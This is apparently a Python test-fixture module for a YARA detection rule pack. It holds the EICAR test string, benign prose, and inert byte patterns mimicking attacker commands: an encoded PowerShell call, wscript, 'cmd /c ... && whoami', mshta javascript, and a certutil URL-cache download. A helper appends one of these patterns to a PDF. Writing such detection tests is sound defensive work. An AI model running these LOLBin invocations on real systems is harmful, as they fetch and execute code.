"""Harmless controlled strings for the DocGuard YARA rule pack."""

from __future__ import annotations

from pathlib import Path

from tests.fixtures.pdf_factory import write_javascript_pdf

EICAR_TEST_BYTES = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
BENIGN_TEXT = b"Quarterly business records for the DocGuard controlled fixture."
BENIGN_POWERSHELL_PROSE = b"PowerShell is a Windows administration tool."
POWERSHELL_ENCODED_PATTERN = b"powershell.exe -EncodedCommand QUJDREVGR0hJSktMTU5PUA=="
BENIGN_WSCRIPT_PROSE = b"This training note discusses WScript.Shell academically."
WSCRIPT_INVOCATION_PATTERN = b"wscript.exe //e:vbscript controlled-fixture.vbs"
BENIGN_CMD_PROSE = b"The cmd.exe command shell and its syntax are described here."
CMD_INVOCATION_PATTERN = b"cmd.exe /c echo controlled-fixture && whoami"
MSHTA_INVOCATION_PATTERN = b"mshta.exe javascript:close()"
CERTUTIL_INVOCATION_PATTERN = (
    b"certutil.exe -urlcache -split https://example.invalid/controlled-fixture"
)


def write_pdf_with_yara_pattern(path: Path) -> Path:
    write_javascript_pdf(path)
    with path.open("ab") as stream:
        stream.write(b"\n% DocGuard controlled trailing fixture\n")
        stream.write(POWERSHELL_ENCODED_PATTERN)
        stream.write(b"\n")
    return path


__all__ = [
    "BENIGN_CMD_PROSE",
    "BENIGN_POWERSHELL_PROSE",
    "BENIGN_TEXT",
    "BENIGN_WSCRIPT_PROSE",
    "CERTUTIL_INVOCATION_PATTERN",
    "CMD_INVOCATION_PATTERN",
    "EICAR_TEST_BYTES",
    "MSHTA_INVOCATION_PATTERN",
    "POWERSHELL_ENCODED_PATTERN",
    "WSCRIPT_INVOCATION_PATTERN",
    "write_pdf_with_yara_pattern",
]
